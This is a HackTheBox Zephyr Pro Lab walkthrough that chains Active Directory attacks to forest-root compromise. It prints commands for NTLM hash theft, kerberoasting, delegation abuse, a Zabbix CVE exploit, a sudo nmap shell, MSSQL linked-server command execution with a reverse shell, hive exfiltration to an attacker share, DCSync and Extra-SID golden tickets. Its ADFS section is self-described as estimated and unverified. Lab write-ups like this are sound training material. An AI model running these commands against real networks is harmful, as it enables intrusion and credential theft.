---
title: "Zephyr Pro Lab"
description: "HackTheBox Zephyr Pro Lab — walkthrough across two AD forests and a child domain: ntlm_theft foothold, kerberoasting, password reuse, constrained delegation, a forest pivot, Zabbix RCE, shadow-group abuse, MSSQL linked servers, and an Extra-SID child→parent escalation to forest root."
pageIcon: "https://app.hackthebox.com/images/icons/ic-prolabs/ic-zephyr-overview.svg"
---

**Zephyr** is a HackTheBox Active Directory Pro Lab built around **two separate
forests** joined by a **bidirectional forest trust** — `painters.htb` and
`zsm.local` — with `zsm.local` also owning a child domain, `internal.zsm.local`.
The path starts with an `ntlm_theft` document dropped through a public web form,
runs through classic password reuse and a service-account kerberoast to
`painters.htb` Domain Admin, **pivots across the forest trust** into `zsm.local`
via a vulnerable Zabbix host, abuses group membership and MSSQL linked servers,
and finishes with an **Extra-SID (SID-history) child→parent escalation** to the
`zsm.local` forest root.

## Attack path

<div style="max-width:680px;margin:1.5rem auto;font-family:system-ui,-apple-system,sans-serif;font-size:.9rem;">
  <div style="display:flex;align-items:center;gap:.75rem;padding:.65rem .9rem;border-radius:10px;border:1px solid rgba(255,255,255,.14);border-left:4px solid #94a3b8;background:rgba(255,255,255,.045);">
    <b style="color:#fff;min-width:96px;">MAIL</b><span style="color:#cbd5e1;"><code>ntlm_theft</code> PDF via the quote form → NetNTLMv2 → <code>riley:P@ssw0rd</code></span>
  </div>
  <div style="text-align:center;color:#64748b;">↓</div>
  <div style="display:flex;align-items:center;gap:.75rem;padding:.65rem .9rem;border-radius:10px;border:1px solid rgba(255,255,255,.14);border-left:4px solid #94a3b8;background:rgba(255,255,255,.045);">
    <b style="color:#fff;min-width:96px;">Loot</b><span style="color:#cbd5e1;">DB config + kerberoast → <code>web_svc:!QAZ1qaz</code></span>
  </div>
  <div style="text-align:center;color:#64748b;">↓</div>
  <div style="display:flex;align-items:center;gap:.75rem;padding:.65rem .9rem;border-radius:10px;border:1px solid rgba(255,255,255,.14);border-left:4px solid #60a5fa;background:rgba(96,165,250,.06);">
    <b style="color:#fff;min-width:96px;">SVC → BPA</b><span style="color:#cbd5e1;">local-admin reuse (<code>James</code>) → <code>PNT-SVRBPA$</code> machine account</span>
  </div>
  <div style="text-align:center;color:#64748b;">↓</div>
  <div style="display:flex;align-items:center;gap:.75rem;padding:.65rem .9rem;border-radius:10px;border:1px solid rgba(255,255,255,.14);border-left:4px solid #fbbf24;background:rgba(251,191,36,.06);">
    <b style="color:#fff;min-width:96px;">DC · painters</b><span style="color:#cbd5e1;"><code>PNT-SVRBPA$</code> ForceChangePassword <code>blake</code> → constrained-deleg S4U → <b>DA</b></span>
  </div>
  <div style="text-align:center;color:#64748b;">↓</div>
  <div style="display:flex;align-items:center;gap:.75rem;padding:.65rem .9rem;border-radius:10px;border:1px solid rgba(255,255,255,.14);border-left:4px solid #94a3b8;background:rgba(255,255,255,.045);">
    <b style="color:#fff;min-width:96px;">Pivot</b><span style="color:#cbd5e1;">Ligolo from painters DC into <code>192.168.210.0/24</code> (the <code>zsm.local</code> forest)</span>
  </div>
  <div style="text-align:center;color:#64748b;">↓</div>
  <div style="display:flex;align-items:center;gap:.75rem;padding:.65rem .9rem;border-radius:10px;border:1px solid rgba(255,255,255,.14);border-left:4px solid #60a5fa;background:rgba(96,165,250,.06);">
    <b style="color:#fff;min-width:96px;">ZABBIX</b><span style="color:#cbd5e1;">CVE-2022-23131 forged cookie → DB → <code>marcus:!QAZ2wsx</code></span>
  </div>
  <div style="text-align:center;color:#64748b;">↓</div>
  <div style="display:flex;align-items:center;gap:.75rem;padding:.65rem .9rem;border-radius:10px;border:1px solid rgba(255,255,255,.14);border-left:4px solid #fbbf24;background:rgba(251,191,36,.06);">
    <b style="color:#fff;min-width:96px;">MGMT1 · CA01</b><span style="color:#cbd5e1;">General Management → reset <code>jamie</code> → SharpChrome → <code>melissa</code></span>
  </div>
  <div style="text-align:center;color:#64748b;">↓</div>
  <div style="display:flex;align-items:center;gap:.75rem;padding:.65rem .9rem;border-radius:10px;border:1px solid rgba(255,255,255,.14);border-left:4px solid #60a5fa;background:rgba(96,165,250,.06);">
    <b style="color:#fff;min-width:96px;">SQL01 → CSQL02</b><span style="color:#cbd5e1;">reused DB creds → impersonate <code>sa</code> → linked server RCE</span>
  </div>
  <div style="text-align:center;color:#64748b;">↓</div>
  <div style="display:flex;align-items:center;gap:.75rem;padding:.65rem .9rem;border-radius:10px;border:1px solid rgba(255,255,255,.14);border-left:4px solid #fbbf24;background:rgba(251,191,36,.06);">
    <b style="color:#fff;min-width:96px;">CDC01</b><span style="color:#cbd5e1;"><code>melissa</code> → child-DC hive save → machine hash → child <code>krbtgt</code></span>
  </div>
  <div style="text-align:center;color:#64748b;">↓</div>
  <div style="display:flex;align-items:center;gap:.75rem;padding:.65rem .9rem;border-radius:10px;border:1px solid rgba(255,255,255,.14);border-left:4px solid #60a5fa;background:rgba(96,165,250,.06);">
    <b style="color:#fff;min-width:96px;">CHR · CSUP</b><span style="color:#cbd5e1;"><code>internal.zsm.local</code> member servers (spray + writable service)</span>
  </div>
  <div style="text-align:center;color:#64748b;">↓</div>
  <div style="display:flex;align-items:center;gap:.75rem;padding:.65rem .9rem;border-radius:10px;border:1px solid rgba(248,113,113,.4);border-left:4px solid #f87171;background:rgba(248,113,113,.08);">
    <b style="color:#fff;min-width:96px;">ZPH-SVRDC01</b><span style="color:#fca5a5;font-weight:600;"><b>Extra-SID</b> child→parent → <code>zsm.local</code> FOREST ROOT</span>
  </div>
  <div style="text-align:center;color:#64748b;">↓</div>
  <div style="display:flex;align-items:center;gap:.75rem;padding:.65rem .9rem;border-radius:10px;border:1px dashed rgba(148,163,184,.5);border-left:4px dashed #94a3b8;background:rgba(255,255,255,.03);">
    <b style="color:#fff;min-width:96px;">ADFS</b><span style="color:#94a3b8;">Golden gMSA → <code>ZPH-GMSA-ADFS$</code> → ADFS host · <i>draft, to be revised</i></span>
  </div>
</div>

## Environment

Hosts span three domains across two routed subnets. The perimeter host **MAIL**
is dual-homed (external `10.10.110.35`, internal `192.168.110.51`); everything in
`192.168.210.0/24` sits behind the internal router and is only reachable after
pivoting from the `painters.htb` DC.

| Host | IP | Domain | Role |
| --- | --- | --- | --- |
| MAIL | `.110.51` / `10.10.110.35` | `painters.htb` | Linux · nginx / mail · entry |
| DC | `.110.55` | `painters.htb` | Domain controller |
| PNT-SVRSVC | `.110.52` | `painters.htb` | Service host |
| PNT-SVRBPA | `.110.53` | `painters.htb` | Server |
| PNT-SVRPSB | `.110.54` | `painters.htb` | Server |
| ZPH-SVRDC01 | `.210.10` | `zsm.local` | Forest-root DC |
| ZPH-SVRMGMT1 | `.210.11` | `zsm.local` | Management host |
| ZPH-SVRCA01 | `.210.12` | `zsm.local` | AD CS |
| ZABBIX | `.210.13` | (zsm.local creds) | Linux · Zabbix |
| ZPH-SVRADFS1 | `.210.14` | `zsm.local` | ADFS |
| ZPH-SVRSQL01 | `.210.15` | `zsm.local` | MSSQL 2019 |
| ZPH-SVRCDC01 | `.210.16` | `internal.zsm.local` | Child DC |
| ZPH-SVRCHR | `.210.17` | `internal.zsm.local` | Server |
| ZPH-SVRCSUP | `.210.18` | `internal.zsm.local` | Server |
| ZSM-SVRCSQL02 | `.210.19` | `internal.zsm.local` | MSSQL 2019 (linked) |

:::note[Out of scope]
The **OPNsense router** (`192.168.210.1`) and **WORKSTATION-1** (`192.168.110.56`)
are not part of the path documented here.
:::

## Initial Access — MAIL (painters.htb)

The perimeter host serves the `painters.htb` site over nginx. The landing page
exposes two user-driven inputs — a **contact form** and a **"get a quote"**
feature — both of which render/process an uploaded document server-side.

Generate a malicious document with **`ntlm_theft`** (files embedding a UNC path
that coerces SMB authentication back to the attacker), upload it through the
quote form, and catch the authentication with Responder. This yields a
**NetNTLMv2** hash for `riley`:

```text title="Captured NetNTLMv2 (riley)"
riley::PAINTERS:aaaaaaaaaaaaaaaa:8c6ac664fcfe43561c7ba877cda6f14c:0101000000...
```

Cracking it recovers `riley:P@ssw0rd`, which is a valid **domain** credential —
it authenticates across the internal `painters.htb` hosts:

```bash title="Validate riley across painters.htb"
nxc smb 192.168.110.0/24 -u riley -p 'P@ssw0rd'
# [+] painters.htb\riley:P@ssw0rd  on DC / PNT-SVRSVC / PNT-SVRBPA
```

> 🚩 MAIL flag `ZEPHYR{HuM4n_3rr0r_1s_0uR_D0wnf4ll}`

The web root on MAIL holds the application's database config, giving DB access as
`riley:PainterDBPassword22`. The `users` table only stores a single bcrypt admin
hash, but the DB credentials themselves are reused elsewhere.

```text title="painter DB — users table"
id | username | password
 1 | admin    | $2y$10$7BLIFYjCq4PF0U3ZH86b1eQLfO9EEIO.GRQMKM5XX02FAbBFd95j2
```

:::note[Ordering]
MAIL's Linux **root** flag `ZEPHYR{L34v3_N0_St0n3_Un7urN3d}` is recovered later —
the `painters.htb` NTDS dump reveals `Matt`'s cleartext password
(`L1f30f4Spr1ngCh1ck3n!`), and `Matt` is root on this box. It's grouped here for
locality but depends on domain compromise below.
:::

## Foothold creds — kerberoast

With `riley`, kerberoast the domain. Two SPNs come back — `blake` (which also
carries **constrained delegation** to the DC, important later) and `web_svc`:

```bash title="Kerberoast with riley"
GetUserSPNs.py painters.htb/riley:'P@ssw0rd' -dc-ip 192.168.110.55 -request
# HTTP/dc.painters.htb   blake     (constrained)
# HTTP/svc.painters.htb  web_svc
```

`web_svc` cracks to **`!QAZ1qaz`**, and `web_svc` is a **local administrator on
PNT-SVRSVC** (`192.168.110.52`).

## PNT-SVRSVC → PNT-SVRBPA — reuse to a machine account

`web_svc` dumps the SAM on PNT-SVRSVC, which contains a local account **`James`**
(`8af1903d3c80d3552a84b6ba296db2ea`). That hash is reused as a **local admin on
PNT-SVRBPA** (`192.168.110.53`):

```text title="PNT-SVRBPA — James reuse (Pwn3d)"
nxc smb 192.168.110.53 -u James -H 8af1903d3c80d3552a84b6ba296db2ea --local-auth --sam
[+] PNT-SVRBPA\James:8af1903d3c80d3552a84b6ba296db2ea (Pwn3d!)
```

> 🚩 PNT-SVRSVC flag `ZEPHYR{S3rV1c3_AcC0Un7_5PN_Tr0uBl35}`
> 🚩 PNT-SVRBPA flag `ZEPHYR{P3r5isT4nc3_1s_k3Y_4_M0v3men7}`

A `secretsdump` on PNT-SVRBPA yields its **machine account** hash:

```text title="PNT-SVRBPA$ machine account"
PAINTERS\PNT-SVRBPA$ : 2dfcebbe9f5f4cb3bf98032887b3d7b6
```

## painters.htb DC — ForceChangePassword + constrained delegation

`PNT-SVRBPA$` has **ForceChangePassword over `blake`**. Reset blake's password
with the machine account, then abuse blake's **constrained delegation** to the DC
(with protocol transition / `altservice`) to impersonate `Administrator` for a
CIFS ticket:

```bash title="BPA$ → reset blake → S4U to the DC"
bloodyad -u 'pnt-svrbpa$' -p ':2dfcebbe9f5f4cb3bf98032887b3d7b6' \
  -d painters.htb --dc-ip 192.168.110.55 set password blake 'Something123'

getST.py -spn 'CIFS/DC.painters.htb' -impersonate 'Administrator' -altservice 'http' \
  -dc-ip 192.168.110.55 'painters.htb/blake:Something123'
```

The resulting ticket dumps NTDS. Beyond the domain accounts, the dump exposes the
**`ZSM$` forest-trust key** and `Matt`'s cleartext password:

```text title="painters.htb NTDS (trimmed)"
Administrator:500:...:5bdd6a33efe43f0dc7e3b2435579aa53
krbtgt:502:...:b59ffc1f7fcd615577dab8436d3988fc
ZSM$:2102:...:6eaec91e3e9424b2397f430acb5243e5        # forest trust account
painters.htb\Matt:CLEARTEXT:L1f30f4Spr1ngCh1ck3n!     # = root on MAIL
```

> 🚩 PNT-SVRPSB flag `ZEPHYR{7h3_Tru57_h45_B3eN_Br0k3n}` — `blake` is a local
> admin on PNT-SVRPSB (`.54`) once his password is reset.

Enumerating the trust confirms a **bidirectional forest trust** to `zsm.local`
(`TrustAttributes: 8`, forest-transitive, SID filtering not enforced):

```text title="Get-ADTrust"
Name : zsm.local   Direction : BiDirectional   ForestTransitive : True
TrustType : Uplevel   SIDFilteringQuarantined : False
```

## Crossing into zsm.local — pivot & Zabbix

The `zsm.local` subnet (`192.168.210.0/24`) is not reachable from the attacker
box — it sits behind the internal router. Stand up a **Ligolo** pivot from the
compromised `painters.htb` DC and add a route to `192.168.210.0/24`; from there
the whole `zsm.local` forest is in reach.

The first foothold in `zsm.local` is the Linux **Zabbix** host (`192.168.210.13`),
vulnerable to **CVE-2022-23131** — an unauthenticated SAML session-cookie forgery
that grants the admin dashboard, which allows command execution as the `zabbix`
user:

```python title="CVE-2022-23131 — forge admin session cookie"
import base64, json
payload = json.dumps({'saml_data': {'username_attribute': 'Admin'}})
print(base64.b64encode(payload.encode()).decode())
```

The host's egress firewall only permits a few ports, so stage the C2 over an
allowed one (an HTTP server on `:53` worked) and land a Sliver beacon. The Zabbix
server config leaks the DB password, and the Zabbix DB in turn contains a
crackable hash for **`marcus:!QAZ2wsx`** — a `zsm.local` domain user:

```text title="Zabbix DB creds"
DBPassword=rDhHbBEfh35sMbkY
marcus : !QAZ2wsx   (zsm.local)
```

Local privilege escalation on the Zabbix box is a **`sudo nmap`** GTFOBin:

```bash title="zabbix → root via sudo nmap"
echo 'os.execute("/bin/sh")' > /tmp/shell.nse
sudo nmap --script=/tmp/shell.nse
```

> 🚩 ZABBIX flag `ZEPHYR{Abu51ng_d3f4ul7_Func710n4li7y_ftw}`

## marcus → jamie → CA01

BloodHound (as `marcus`) shows two useful edges: `marcus` can
**AddKeyCredentialLink** on `ZPH-SVRMGMT1$`, and — via the **General Management**
group — can change the password of **`jamie`**. The shadow-credential route on
`ZPH-SVRMGMT1$` recovered a machine hash but didn't yield usable access, so the
working path is the group-membership one:

```bash title="Add marcus to General Management → reset jamie"
bloodyAD -u marcus -p '!QAZ2wsx' -d zsm.local --dc-ip 192.168.210.10 \
  add groupMember 'GENERAL MANAGEMENT' marcus
bloodyAD -u marcus -p '!QAZ2wsx' -d zsm.local --dc-ip 192.168.210.10 \
  set password jamie 'Pwned1234!'
```

`jamie` is a **local admin on ZPH-SVRMGMT1** and can add himself to the **CA
Managers** group, which grants login to **ZPH-SVRCA01**:

```bash title="jamie → CA Managers"
bloodyAD -u jamie -p 'Pwned1234!' -d zsm.local --dc-ip 192.168.210.10 \
  add groupMember 'CA MANAGERS' jamie
```

> 🚩 ZPH-SVRMGMT1 flag `ZEPHYR{K3y_Cr3d3n714l_l1nk_d4ng3r}`
> 🚩 ZPH-SVRCA01 flag `ZEPHYR{C0n57r4in3d_d3l3g4710n_1s_d4ng3r0us}`

:::caution[ADCS attempts were dead-ends]
Being CA Managers looks like a path to an AD CS escalation, but the certificate
attacks **did not pan out** here: `certipy find` reported no vulnerable
templates, an **ESC3** request on the `User` template produced an unusable cert,
and **ESC7 / SubCA** was refused with `CERTSRV_E_TEMPLATE_DENIED`. The CA01 flag
above comes from `jamie` logging into the host as CA Managers, **not** from a
cert forgery. The route forward is credentials looted from ZPH-SVRMGMT1 (below).
:::

On ZPH-SVRMGMT1, **SharpChrome** dumps a saved browser credential — the first
step into the child domain:

```text title="SharpChrome (marcus on ZPH-SVRMGMT1)"
https://zephyr.atlassian.htb/   melissa : WinterIsHere2022!   (internal.zsm.local)
```

## SQL01 → CSQL02 — MSSQL linked servers

The Zabbix DB password is reused on **ZPH-SVRSQL01** (`192.168.210.15`), where the
`zabbix` SQL login can **impersonate `sa`** — enabling `xp_cmdshell`:

```sql title="Impersonate sa on ZPH-SVRSQL01"
EXECUTE AS LOGIN = 'sa';
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';   -- nt service\mssqlexpress
```

The shell runs with **`SeImpersonate`** → GodPotato → local admin. SQL01 also has
a **linked server to `ZSM-SVRCSQL02`** (`192.168.210.19`, in the child domain),
and the same `sa`-impersonation is available across the link:

```sql title="Linked-server RCE on ZSM-SVRCSQL02"
EXEC ('sp_configure ''show advanced options'',1; RECONFIGURE;') AT [ZSM-SVRCSQL02];
EXEC ('sp_configure ''xp_cmdshell'',1; RECONFIGURE;')          AT [ZSM-SVRCSQL02];
EXEC ('xp_cmdshell ''powershell -e <b64-revshell>''')          AT [ZSM-SVRCSQL02];
```

Again `SeImpersonate` → GodPotato → local admin on CSQL02.

> 🚩 ZPH-SVRSQL01 flag `ZEPHYR{SQLi_2_Imp3rs0n4710n_fun}`
> 🚩 ZSM-SVRCSQL02 flag `ZEPHYR{G0tt4_l1nk_Up_4m_1_r1gh7?}`

## melissa → CDC01 — owning internal.zsm.local

`melissa` (from the SharpChrome loot) has enough rights on the **child DC
ZPH-SVRCDC01** (`192.168.210.16`) to remotely save the registry hives, even
without an interactive logon. Pull `SAM`/`SECURITY`/`SYSTEM` back over SMB and
recover the DC's **machine account** hash:

```bash title="reg.py hive save (melissa)"
reg.py internal.zsm.local/melissa:'WinterIsHere2022!'@192.168.210.16 save \
  -keyName 'HKLM\SAM' -o '\\10.10.16.17\share\'
# repeat for HKLM\SECURITY and HKLM\SYSTEM
secretsdump.py -sam SAM.save -security SECURITY.save -system SYSTEM.save LOCAL
# -> ZPH-SVRCDC01$ : d47a6d90e1c5adf4200227514e393948
```

The machine account then performs a **DRSUAPI** replication (DCSync) of the child
domain, handing over `internal.zsm.local`'s `krbtgt`:

```bash title="Child-domain DCSync via the machine account"
secretsdump.py internal.zsm.local/'ZPH-SVRCDC01$'@192.168.210.16 \
  -hashes ':d47a6d90e1c5adf4200227514e393948'
# krbtgt:502:...:0540fe51ddd618f42a66ef059ac36441
```

> 🚩 ZPH-SVRCDC01 flag `ZEPHYR{In73rn4l_D0m41n_D0m1n473d}`

## CHR & CSUP — internal member servers

A password from one of the child-domain user descriptions
(`ToughPasswordToCrack123!`, also `mssql_svc`'s password) sprays successfully as
**`Aron`** on **ZPH-SVRCHR** (`192.168.210.17`). Aron has WinRM, and a **writable
service** (`wuauserv`, granted `AllAccess` to the *Service Management* group)
allows a classic binPath hijack to local admin:

```bash title="Writable service → local admin (ZPH-SVRCHR)"
sc.exe config wuauserv binpath= "cmd.exe /c net localgroup administrators Aron /add"
sc.exe start wuauserv
```

**ZPH-SVRCSUP** (`192.168.210.18`) is reachable from CHR (second Ligolo hop), with
`melissa` as a local admin there.

> 🚩 ZPH-SVRCSUP flag `ZEPHYR{D0n7_f0rg3t_Imp0rt4nt_Inf0rm4710n}`

## ZPH-SVRDC01 — Extra-SID child→parent to forest root

With the **child `krbtgt`** in hand, forge a golden ticket in `internal.zsm.local`
and inject the **parent `Enterprise Admins` SID** (`...-519`) via SID history —
the classic **Extra-SID / child→parent** escalation. Because both domains are in
the same forest, this grants Domain Admin on the parent `zsm.local` DC:

```bash title="Extra-SID escalation → zsm.local forest root"
ticketer.py -aesKey b6252a6e5ec060751a03c1a73ef2af4e \
  -domain-sid S-1-5-21-3056178012-3972705859-491075245 \
  -domain internal.zsm.local \
  -extra-sid S-1-5-21-2734290894-461713716-141835440-519 \
  Administrator

nxc smb 192.168.210.10 --use-kcache --ntds
# [+] INTERNAL.ZSM.LOCAL\Administrator from ccache (Pwn3d!) on ZPH-SVRDC01
```

Dumping the parent NTDS completes `zsm.local`. **Forest root owned.** 🏁

> 🚩 ZPH-SVRDC01 flag `ZEPHYR{34t1ng_7h3_B0n3s_0f_N3tw0rks}`

## ADFS — Golden gMSA (draft, to be revised)

:::caution[This section is estimated and incomplete]
The notes for ADFS stop at gMSA enumeration; the steps below describe what the
attack *should* entail and are **placeholder/estimated** — treat commands and
specifics as approximate until this is redone and verified.
:::

**ZPH-SVRADFS1** (`192.168.210.14`) runs Active Directory Federation Services
under the group-managed service account **`ZPH-GMSA-ADFS$`**. With the child DC's
machine account (`ZPH-SVRCDC01$`) we can already read the gMSA metadata, which is
the setup for a **Golden gMSA** attack:

```text title="gMSA enumeration (confirmed)"
sAMAccountName : ZPH-GMSA-ADFS$
objectSid      : S-1-5-21-2734290894-461713716-141835440-1105
rootKeyGuid    : 78efe0aa-8c01-111e-5c41-df1792ea31d1
msDS-ManagedPasswordId : AQAAAEtEU0sCAAAA...
```

From here the *intended* path — to be confirmed on a rerun — is roughly:

1. **Recover the KDS root key.** With Domain/Enterprise Admin (which we now hold
   on `zsm.local`), read the KDS root key referenced by `rootKeyGuid` from the
   Domain Controller.
2. **Compute the gMSA managed password** offline for `ZPH-GMSA-ADFS$` using the
   root key + `msDS-ManagedPasswordId` (e.g. `GoldenGMSA`), deriving its NT hash
   without ever touching the account's LSASS.
3. **Act as the ADFS service account.** Use that hash to authenticate as
   `ZPH-GMSA-ADFS$` and extract the **ADFS DKM master key** / token-signing
   material, enabling a **Golden SAML** forgery against relying parties — and/or
   simply pivot onto the ADFS host for its flag.

This should complete the `ZEPHYR-ADFS` objective; the flag and the exact
DKM/Golden-SAML commands still need to be captured. **← revisit.**

## Takeaways

- **A document upload is a credential.** `ntlm_theft` through a public quote form
  coerced a domain user's NetNTLMv2 — the entire lab unlocks from one cracked
  hash and heavy **password/credential reuse**.
- **Delegation is a domain-takeover primitive.** A machine account's
  `ForceChangePassword` over a user with **constrained delegation** to the DC
  (plus `altservice`) was the whole road to `painters.htb` DA.
- **Forest trusts are a bridge, not a wall.** DA in one forest bootstrapped the
  pivot into the second; a vulnerable **Zabbix** host then handed over the first
  `zsm.local` credential.
- **Child domains are the parent's soft underbelly.** Owning
  `internal.zsm.local`'s `krbtgt` and injecting the parent **Enterprise Admins
  SID** (Extra-SID) escalated straight to the `zsm.local` forest root.
